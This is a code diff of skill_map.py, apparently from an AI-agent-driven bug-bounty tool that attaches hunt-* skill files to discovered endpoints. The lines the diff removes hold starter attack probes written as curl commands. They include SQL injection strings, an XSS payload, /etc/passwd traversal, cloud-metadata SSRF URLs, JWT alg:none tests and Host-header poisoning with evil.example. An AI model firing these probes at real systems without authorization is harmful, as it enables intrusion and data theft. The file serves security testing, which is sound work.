@@ -1,73 +1,15 @@
 #!/usr/bin/env python3
 """
-skill_map.py — categorize the discovered attack surface against the hunt-* skill arsenal.
+skill_map.py — attach hunt-* skills that already exist on disk.
 
-The engine's job is NOT to test everything itself. It maps the surface, then tells the
-operator *which skill applies where* and *the first curl to run* — so the human spends
-their 20% expert effort where the 80% automation points:
-
-    surface (endpoint / parameter)  ->  attack class  ->  which hunt-* skill  ->  first curl
-
-Mappings are grounded in the skills actually installed (~/.claude/skills); anything not
-present is filtered out so we never point at a skill that isn't there.
-Active testing is curl-first; Burp MCP is optional (only where noted — OOB/blind/fuzzing).
+There is no class→skill catalog and no payload catalog. A new hunt-* directory
+is eligible the next call. Deep hunts invent the test from live bytes; these
+paths are hints, not a menu.
 """
 import os
+import re
 
 SKILLS_DIR = os.path.expanduser("~/.claude/skills")
-
-# attack class -> hunt skill(s) in the bundle
-CLASS_SKILL = {
-    "sqli": ["hunt-sqli"], "nosqli": ["hunt-nosqli"], "xss": ["hunt-xss", "hunt-dom"],
-    "ssrf": ["hunt-ssrf", "hunt-webhook"], "idor": ["hunt-idor"], "open-redirect": ["hunt-open-redirect"],
-    "lfi": ["hunt-lfi"], "ssti": ["hunt-ssti"], "rce": ["hunt-rce"], "xxe": ["hunt-xxe"],
-    "auth-bypass": ["hunt-auth-bypass", "hunt-jwt", "hunt-session"], "jwt": ["hunt-jwt", "hunt-auth-bypass"],
-    "llm-ai": ["hunt-llm-ai", "hunt-mcp"], "mcp": ["hunt-mcp", "hunt-llm-ai"],
-    "saml": ["hunt-saml"], "oauth": ["hunt-oauth"], "mfa": ["hunt-mfa-bypass"],
-    "graphql": ["hunt-graphql"], "csrf": ["hunt-csrf"], "cors": ["hunt-cors"],
-    "info-leak": ["hunt-source-leak", "hunt-api-misconfig"], "secret": ["hunt-source-leak"],
-    "deserialization": ["hunt-deserialization"], "file-upload": ["hunt-file-upload"],
-    "host-header": ["hunt-host-header"], "http-smuggling": ["hunt-http-smuggling"],
-    "race-condition": ["hunt-race-condition"], "business-logic": ["hunt-business-logic"],
-    "webhook": ["hunt-webhook", "hunt-ssrf"], "api": ["hunt-api-owasp", "hunt-api-misconfig"],
-    "baas": ["hunt-baas", "hunt-cloud-misconfig"],
-}
-
-# detected tech -> tech-specific skill(s)
-TECH_SKILL = {
-    "next.js": ["hunt-nextjs"], "node.js": ["hunt-nodejs"], "react": ["hunt-dom"],
-    "wordpress": ["hunt-sqli", "hunt-idor"], "laravel": ["hunt-laravel"], "spring": ["hunt-springboot"],
-    "asp.net": ["hunt-aspnet"], "sharepoint": ["hunt-sharepoint"], "graphql": ["hunt-graphql"],
-    "grpc": ["hunt-grpc"],
-}
-
-# curl-first starter probe per class. {u}=url with FUZZ->1, {ur}=injection prefix (before the value)
-CLASS_PROBE = {
-    "sqli": "curl -s \"{u}\"   # then  ' OR '1'='1'--  and time-based  ' AND SLEEP(5)--  (Burp Intruder for blind)",
-    "nosqli": "curl -s \"{u}\"   # then  [$ne]=1 / {\"$gt\":\"\"}  in the param",
-    "xss": "curl -s \"{ur}z1z<svg/onload=alert(1)>\"   # check the marker comes back UNencoded",
-    "open-redirect": "curl -sI \"{ur}https://evil.example\"   # inspect the Location: response header",
-    "ssrf": "curl -s \"{ur}http://169.254.169.254/latest/meta-data/\"   # Burp Collaborator for blind OOB",
-    "idor": "curl -s \"{u}\"   # swap/increment the id across two identities; diff the bodies",
-    "lfi": "curl -s \"{ur}../../../../etc/passwd\"   # also php://filter/convert.base64-encode/resource=",
-    "ssti": "curl -s \"{ur}{{7*7}}\"   # look for 49 (or ${7*7}); confirm engine before RCE",
-    "rce": "curl -s \"{u}\"   # only with explicit authorization; start with benign id;sleep markers",
-    "xxe": "curl -s -X POST \"{u}\" -d '<?xml ...>'   # OOB via Collaborator if blind",
-    "auth-bypass": "curl -s \"{u}\"   # no token / expired token / role swap / forced browse",
-    "llm-ai": "curl -s -X POST \"{u}\" -H 'Content-Type: application/json' -d '{\"messages\":[{\"role\":\"user\",\"content\":\"...\"}]}'   # prompt-injection / system-prompt extraction",
-    "graphql": "curl -s -X POST \"{u}\" -d '{\"query\":\"{__schema{types{name}}}\"}'   # introspection",
-    "csrf": "curl -s \"{u}\"   # check for SameSite / CSRF token on state-changing POST",
-    "info-leak": "curl -s \"{u}\"   # inspect for secrets / verbose errors / source / stack traces",
-    "secret": "curl -s \"{u}\"   # confirm the exposed secret is present (read-only — do NOT exercise it)",
-    "host-header": "curl -s \"{u}\" -H 'Host: evil.example'   # check for reflection / cache / pw-reset poisoning",
-    "saml": "curl -s \"{u}\"   # inspect SAML/SSO config endpoints; test XSW / signature-stripping / IdP confusion (needs auth)",
-    "oauth": "curl -s \"{u}\"   # check redirect_uri validation, state, PKCE, token leakage",
-    "jwt": "curl -s \"{u}\" -H 'Authorization: Bearer <eyJ...>'   # decode header; test alg:none, RS256->HS256 key confusion, kid/jku injection",
-    "webhook": "curl -s -X POST \"{u}\" -d '{\"url\":\"http://169.254.169.254/latest/meta-data/\"}'   # Burp Collaborator for blind OOB, then internal targets",
-    "api": "curl -s \"{u}/openapi.json\" ; curl -s \"{u}/swagger.json\"   # inventory the spec first, then walk the API Top 10",
-    "mcp": "curl -s -X POST \"{u}\" -H 'Content-Type: application/json' -d '{\"jsonrpc\":\"2.0\",\"id\":1,\"method\":\"tools/list\"}'   # enumerate tools, then audit every description + FULL schema for poisoning",
-    "baas": "curl -s \"{u}/rest/v1/<table>?select=*\" -H 'apikey: <anon>'   # Supabase RLS; Firebase: <db>.firebaseio.com/<path>.json",
-}
 
 
 def _present():
@@ -82,26 +24,61 @@ def _filter(names):
     return [s for s in names if not present or s in present]
 
 
-def skills_for(vuln_class, tech=None):
-    """Class-specific skill(s) for a vuln class (tech kept separate — see tech_skills)."""
-    out = _filter(CLASS_SKILL.get(vuln_class, []))
-    return out or _filter(["hunt-misc"])
+def installed():
+    """Every hunt-* / methodology skill directory on disk. The agent may Read any of them."""
+    names = []
+    for n in sorted(_present()):
+        if n.startswith("hunt-") or n in ("security-arsenal", "triage-rtfs", "triage-validation",
+                                          "redteam-mindset", "bb-methodology", "dedup-novelty"):
+            names.append(n)
+    return names
+
+
+def matching(url="", tech=None, analysis="", extra=""):
+    """Skills whose names appear in the live URL, stack, or last analysis.
+
+    This is a HINT for which SKILL.md to attach, not a closed list of vulns.
+    """
+    blob = " ".join([str(url or ""), " ".join(tech or []), str(analysis or ""), str(extra or "")]).lower()
+    blob_n = re.sub(r"[^a-z0-9]+", "", blob)
+    generic = {"http", "https", "www", "html", "xml", "json", "url", "web", "app", "info",
+               "misc", "misconfig", "owasp", "api"}
+    hits = []
+    for name in installed():
+        if not name.startswith("hunt-"):
+            continue
+        parts = [p for p in name.replace("hunt-", "").split("-") if len(p) > 2 and p not in generic]
+        if parts and any(p in blob or re.sub(r"[^a-z0-9]+", "", p) in blob_n for p in parts):
+            hits.append(name)
+    if "hunt-hypothesis" not in hits and "hunt-hypothesis" in _present():
+        hits.insert(0, "hunt-hypothesis")
+    return hits[:8]
+
+
+def skills_for(vuln_class, tech=None, url="", analysis=""):
+    """Skills on disk whose names match this URL/stack/class token. No built-in map."""
+    extra = " ".join(x for x in (vuln_class, analysis) if x)
+    hits = matching(url, tech, extra)
+    slug = "hunt-" + str(vuln_class or "").replace("_", "-").lower()
+    if vuln_class and vuln_class not in ("deep", "") and slug in _present() and slug not in hits:
+        hits.append(slug)
+    if hits:
+        return hits
+    if "hunt-hypothesis" in _present():
+        return ["hunt-hypothesis"]
+    return _filter(["hunt-misc"])
 
 
 def tech_skills(tech):
-    """Tech-stack skill(s) for the detected service tech (target-wide, not per class)."""
-    out = []
-    for t in (tech or []):
-        for s in _filter(TECH_SKILL.get((t or "").lower(), [])):
-            if s not in out:
-                out.append(s)
-    return out
+    """Skills whose names appear in the detected stack strings. No tech→class table."""
+    return matching("", tech=tech)
 
 
-def skill_paths(vuln_class, tech=None, extra=("security-arsenal", "triage-rtfs")):
-    """Absolute SKILL.md paths for the class (+ tech) skills that actually exist on disk, so a
-    cursor-agent can READ and follow the real methodology/payloads — not merely see a skill name."""
-    names = skills_for(vuln_class) + (tech_skills(tech) if tech else []) + list(extra)
+def skill_paths(vuln_class, tech=None, extra=("security-arsenal", "triage-rtfs", "hunt-hypothesis"),
+                url="", analysis=""):
+    """Absolute SKILL.md paths that actually exist on disk."""
+    names = skills_for(vuln_class, tech=tech, url=url, analysis=analysis)
+    names += (tech_skills(tech) if tech else []) + list(extra)
     seen, out = set(), []
     for n in names:
         if n in seen:
@@ -114,22 +91,13 @@ def skill_paths(vuln_class, tech=None, extra=("security-arsenal", "triage-rtfs")
 
 
 def probe_for(vuln_class, url, param=None):
-    """Curl-first starter probe string for a (class, url)."""
-    tmpl = CLASS_PROBE.get(vuln_class, "curl -s \"{u}\"")
-    u = url.replace("FUZZ", "1")
-    if "FUZZ" in url:
-        ur = url.split("FUZZ", 1)[0]
-    elif param:
-        ur = url + ("&" if "?" in url else "?") + param + "="
-    else:
-        ur = url + ("&" if "?" in url else "?") + "x="
-    return tmpl.replace("{u}", u).replace("{ur}", ur)
+    """A GET of the live URL. Payloads are invented from the response, not this function."""
+    u = (url or "").replace("FUZZ", "1")
+    return f'curl -s "{u}"'
 
 
 if __name__ == "__main__":
-    miss = [s for skills in list(CLASS_SKILL.values()) + list(TECH_SKILL.values())
-            for s in skills if _present() and s not in _present()]
-    print(f"skill_map: {len(CLASS_SKILL)} class mappings, {len(TECH_SKILL)} tech mappings")
-    print(f"  skills referenced but NOT installed: {sorted(set(miss)) or 'none'}")
-    for c in ("sqli", "open-redirect", "llm-ai", "idor"):
-        print(f"  {c:14s} -> {skills_for(c, ['Next.js'])}  ::  {probe_for(c, 'https://t/?p=FUZZ', 'p')}")
+    names = [n for n in installed() if n.startswith("hunt-")]
+    print(f"skill_map: {len(names)} hunt-* skill(s) on disk (no class catalog)")
+    print(f"  matching Next.js /api/users -> {matching('/api/users', ['Next.js'])}")
+    print(f"  probe -> {probe_for('deep', 'https://t/?p=FUZZ', 'p')}")
